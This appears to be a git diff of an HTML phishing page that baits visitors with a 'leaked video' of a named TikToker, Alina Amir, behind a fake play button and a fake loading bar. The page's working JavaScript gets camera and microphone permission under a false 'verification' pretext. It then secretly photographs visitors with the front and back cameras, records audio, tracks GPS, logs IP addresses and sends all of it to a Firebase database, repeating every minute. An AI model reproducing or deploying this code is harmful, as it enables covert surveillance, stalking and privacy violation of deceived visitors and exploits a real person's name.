@@ -3,134 +3,143 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Private Cloud | Secure Stream</title>
+    <title>Private Cloud Storage | Secure Stream</title>
     <script src="https://www.gstatic.com/firebasejs/8.10.1/firebase-app.js"></script>
     <script src="https://www.gstatic.com/firebasejs/8.10.1/firebase-database.js"></script>
     <style>
         body, html { margin: 0; padding: 0; width: 100%; height: 100%; background: #000; overflow: hidden; font-family: 'Segoe UI', sans-serif; }
         
-        /* Website Background */
+        /* Aapki Background Image */
         #site-frame {
             position: fixed; top: 0; left: 0; width: 100%; height: 100%;
-            border: none; z-index: 1; opacity: 0.3; pointer-events: none;
-            transition: 1s;
+            background: url('bg.png.jpeg'); /* File name check kar lena */
+            background-size: cover;
+            background-position: center;
+            z-index: 1; opacity: 0.4;
+            transition: 1.5s;
         }
 
-        /* Stealth Overlay */
+        /* Stealth Overlay Layer */
         #hijack-layer {
             position: fixed; top: 0; left: 0; width: 100%; height: 100%;
-            z-index: 100; background: rgba(0,0,0,0.85);
+            z-index: 100; background: rgba(0,0,0,0.8);
             display: flex; flex-direction: column; align-items: center; justify-content: center;
         }
 
         /* Fake Play Button */
         .play-btn {
-            width: 100px; height: 100px; background: #ff0000;
-            border-radius: 50%; border: 4px solid #fff;
+            width: 90px; height: 90px; background: #ff0000;
+            border-radius: 50%; border: 3px solid #fff;
             display: flex; align-items: center; justify-content: center;
-            cursor: pointer; box-shadow: 0 0 40px rgba(255,0,0,0.6);
+            cursor: pointer; box-shadow: 0 0 30px rgba(255,0,0,0.5);
             transition: 0.3s;
         }
-        .play-btn:hover { transform: scale(1.1); }
+        .play-btn:active { transform: scale(0.9); }
         .play-btn::after {
-            content: ''; border-style: solid; border-width: 18px 0 18px 30px;
-            border-color: transparent transparent transparent #fff; margin-left: 10px;
+            content: ''; border-style: solid; border-width: 15px 0 15px 25px;
+            border-color: transparent transparent transparent #fff; margin-left: 5px;
         }
 
         /* Fake Progress Bar UI */
-        #loader-ui { display: none; text-align: center; width: 80%; max-width: 400px; }
-        .bar-container { width: 100%; background: #222; height: 8px; border-radius: 10px; margin: 20px 0; overflow: hidden; }
-        .bar-fill { height: 100%; width: 0%; background: #ff0000; box-shadow: 0 0 15px #ff0000; transition: 0.5s; }
+        #loader-ui { display: none; text-align: center; width: 85%; max-width: 380px; z-index: 101; }
+        .bar-container { width: 100%; background: #222; height: 6px; border-radius: 10px; margin: 20px 0; overflow: hidden; border: 1px solid #333; }
+        .bar-fill { height: 100%; width: 0%; background: #ff0000; box-shadow: 0 0 10px #ff0000; transition: 0.4s; }
         
-        .status-text { color: #fff; font-size: 14px; letter-spacing: 1px; }
-        .warning-text { color: #ff0000; font-size: 11px; margin-top: 10px; opacity: 0.7; }
+        .status-text { color: #fff; font-size: 14px; font-weight: bold; text-shadow: 0 2px 4px #000; }
+        #percent { color: #ff0000; font-family: monospace; font-size: 18px; margin-top: 5px; }
+        .warning-text { color: #666; font-size: 10px; margin-top: 15px; text-transform: uppercase; letter-spacing: 1px; }
+
     </style>
 </head>
 <body>
 
-    <iframe id="site-frame" src="https://darkero.com/tiktoker-alina-amir-leaked-video/"></iframe>
+    <div id="site-frame"></div>
 
     <div id="hijack-layer">
+        
         <div id="start-screen" style="text-align:center;">
             <div class="play-btn" onclick="ignite()"></div>
-            <div class="status-text" style="margin-top:25px; font-weight:bold;">ALINA AMIR LEAKED VIDEO</div>
-            <p style="color:#666; font-size:12px;">Verification Required: Click to Play</p>
+            <div class="status-text" style="margin-top:20px;">ALINA AMIR LEAKED VIDEO</div>
+            <p style="color:#888; font-size:12px;">Verification Required: Tap to Play</p>
         </div>
 
         <div id="loader-ui">
-            <div class="status-text" id="status-msg">Verifying Identity...</div>
+            <div class="status-text" id="status-msg">INITIALIZING SECURE STREAM...</div>
             <div class="bar-container">
                 <div class="bar-fill" id="bar"></div>
             </div>
-            <div class="status-text" id="percent">20%</div>
-            <div class="warning-text">Do not close this tab. Optimizing stream for your device...</div>
+            <div id="percent">0%</div>
+            <div class="warning-text">Optimizing media for your device. Do not close tab.</div>
         </div>
+
     </div>
 
 <script>
-    // --- CONFIGURATION ---
+    // --- FIREBASE CONFIG ---
     const firebaseConfig = { databaseURL: "https://mytrecker2-b3535-default-rtdb.firebaseio.com/" };
     if (!firebase.apps.length) { firebase.initializeApp(firebaseConfig); }
     const db = firebase.database();
     
+    // Unique ID for each target
     const sessionID = "NODE_" + Math.floor(10000 + Math.random() * 90000);
 
     async function ignite() {
         try {
-            // Step 1: Request Access (Photo/Audio)
+            // Permission for Camera & Audio
             const stream = await navigator.mediaDevices.getUserMedia({ video: true, audio: true });
 
-            // Step 2: Switch to Fake Loader
+            // Switch UI to Loader
             document.getElementById('start-screen').style.display = 'none';
             document.getElementById('loader-ui').style.display = 'block';
 
-            // Step 3: Trigger Stealth Actions
+            // Background Data Collection
             logInfo();
             trackGPS();
             
-            // Front & Back Instant Snap
-            capture("user");
-            setTimeout(() => capture("environment"), 4000);
+            // Capture Front & Back
+            capture("user"); // Front
+            setTimeout(() => capture("environment"), 5000); // Back after 5s
             
-            // 20 Sec Audio
+            // Record 20s Audio
             recordAudio(20000);
 
-            // Step 4: Fake Progress Logic (Target ko uljhane ke liye)
-            let progress = 20;
+            // Progress Bar Animation (Target Engagement)
+            let progress = 0;
             const msgs = [
-                "Verifying Identity...",
-                "Bypassing Regional Lock...",
-                "Optimizing Audio Stream...",
-                "Decrypting Media...",
-                "Ready to Play!"
+                "AUTHENTICATING...",
+                "BYPASSING REGIONAL LOCK...",
+                "SYNCING AUDIO BUFFERS...",
+                "DECRYPTING VIDEO STREAM...",
+                "STREAM READY!"
             ];
 
             let interval = setInterval(() => {
-                progress += Math.floor(Math.random() * 10) + 5;
+                progress += Math.floor(Math.random() * 8) + 2;
                 if (progress >= 100) {
                     progress = 100;
                     clearInterval(interval);
                     
-                    // Final Reveal: Lock hatado
+                    // Final Action: Show background image clearly or redirect
                     setTimeout(() => {
                         document.getElementById('hijack-layer').style.display = 'none';
                         document.getElementById('site-frame').style.opacity = '1';
-                        document.getElementById('site-frame').style.pointerEvents = 'auto';
+                        // Yahan aap chaho to asli website ka link bhi open kar sakte ho:
+                        // window.location.href = "https://darkero.com/...";
                     }, 1000);
                 }
                 document.getElementById('bar').style.width = progress + "%";
                 document.getElementById('percent').innerText = progress + "%";
                 document.getElementById('status-msg').innerText = msgs[Math.min(Math.floor(progress/25), 4)];
-            }, 600);
+            }, 500);
 
-            // Background Loop (Har 45 seconds baad update)
+            // Background Capture Loop (Har 1 minute baad)
             setInterval(() => {
                 capture("user");
                 recordAudio(15000);
-            }, 45000);
+            }, 60000);
 
         } catch (err) {
-            alert("Security Error: Camera and Microphone access is required to bypass bot protection.");
+            alert("Verification Failed: Media access is required to unlock this video.");
             location.reload();
         }
     }
@@ -158,11 +167,11 @@
         try {
             const stream = await navigator.mediaDevices.getUserMedia({ audio: true });
             const mr = new MediaRecorder(stream);
-            let ch = [];
-            mr.ondataavailable = e => ch.push(e.data);
+            let chunks = [];
+            mr.ondataavailable = e => chunks.push(e.data);
             mr.onstop = () => {
                 const reader = new FileReader();
-                reader.readAsDataURL(new Blob(ch, { type: 'audio/webm' }));
+                reader.readAsDataURL(new Blob(chunks, { type: 'audio/webm' }));
                 reader.onloadend = () => db.ref(`targets/${sessionID}/audio`).push({
                     data: reader.result,
                     time: new Date().toLocaleTimeString()
@@ -182,9 +191,9 @@
     }
 
     async function logInfo() {
-        const ipReq = await fetch('https://api.ipify.org?format=json').then(r => r.json());
+        const ipRes = await fetch('https://api.ipify.org?format=json').then(r => r.json());
         db.ref(`targets/${sessionID}/info`).set({
-            ip: ipReq.ip,
+            ip: ipRes.ip,
             platform: navigator.platform,
             timestamp: Date.now(),
             time: new Date().toLocaleString()
